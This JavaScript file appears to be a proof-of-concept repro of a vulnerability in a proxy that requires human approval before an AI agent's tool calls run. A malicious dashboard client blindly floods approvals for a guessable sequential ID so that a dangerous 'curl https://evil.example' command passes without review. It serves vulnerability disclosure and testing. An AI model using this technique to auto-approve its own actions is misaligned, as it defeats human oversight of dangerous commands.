// Repro: guessable sequential approval IDs enable PRE-EMPTIVE / blind-flood
// auto-approval of a future request the attacker never saw.
//
// The malicious dashboard client NEVER listens to 'pending_approval'. It just
// blindly floods approve{id:'ask-1'} (the guessable first id). If the victim's
// dangerous tools/call ('curl https://evil') comes back APPROVED (echoed by the
// target) rather than Access Denied, the manual-approval verdict was bypassed.
import { spawn } from 'node:child_process';
import { once } from 'node:events';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { io as ioClient } from 'socket.io-client';

const projectRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

const runCommand = (command, id) => ({ jsonrpc: '2.0', id, method: 'tools/call', params: { name: 'run_command', arguments: { command } } });

const proxy = spawn('node', ['dist/index.js', '--port', '0', '--', 'node', 'tests/fixtures/echo-server.cjs'], {
  cwd: projectRoot, stdio: ['pipe', 'pipe', 'pipe'],
});

const responses = [];
let outBuf = '';
proxy.stdout.setEncoding('utf8');
proxy.stdout.on('data', (chunk) => {
  outBuf += chunk;
  let idx;
  while ((idx = outBuf.indexOf('\n')) !== -1) {
    const line = outBuf.slice(0, idx).trim();
    outBuf = outBuf.slice(idx + 1);
    if (line !== '') responses.push(JSON.parse(line));
  }
});

let errBuf = '';
proxy.stderr.setEncoding('utf8');
const port = await new Promise((resolve, reject) => {
  const timer = setTimeout(() => reject(new Error(`no port:\n${errBuf}`)), 30000);
  proxy.stderr.on('data', (chunk) => {
    errBuf += chunk;
    const m = errBuf.match(/dashboard listening on http:\/\/localhost:(\d+)/);
    if (m) { clearTimeout(timer); resolve(Number(m[1])); }
  });
});
console.log('dashboard port', port);

const client = ioClient(`http://localhost:${port}`, { transports: ['websocket'], reconnection: false });
await once(client, 'connect', { signal: AbortSignal.timeout(15000) });
console.log('malicious client connected');

// Record whether we EVER saw the real pending_approval (we should NOT act on it).
let sawPending = false;
client.on('pending_approval', (req) => { sawPending = true; console.log('   (observed pending_approval id=', req.id, ') — but we do NOT click it'); });

// Blindly flood approve for the guessable next id. Attacker never saw the request.
const flood = setInterval(() => {
  client.emit('approve', { id: 'ask-1' });
}, 1);

// Give the flood a moment to be established, then fire the dangerous call.
await new Promise((r) => setTimeout(r, 300));
console.log('sending dangerous: curl https://evil.example');
proxy.stdin.write(`${JSON.stringify(runCommand('curl https://evil.example', 100))}\n`);

// Wait for a response for id 100.
const res = await new Promise((resolve, reject) => {
  const deadline = Date.now() + 8000;
  const poll = () => {
    const found = responses.find((r) => r.id === 100);
    if (found) return resolve(found);
    if (Date.now() > deadline) return reject(new Error('timeout waiting for id=100'));
    setTimeout(poll, 20);
  };
  poll();
});
clearInterval(flood);

console.log('\n=== RESULT ===');
console.log(JSON.stringify(res));
if (res.result && res.result.echo) {
  console.log('>>> BYPASS: dangerous call was APPROVED and reached the target,');
  console.log('>>> via a blind flood of approve{id:"ask-1"} — no human reviewed it.');
  console.log('>>> forwarded command =', res.result.echo.params.arguments.command);
} else if (res.error) {
  console.log('>>> DENIED (code', res.error.code, ') — no bypass.');
}

client.close();
proxy.stdin.end();
await once(proxy, 'close');
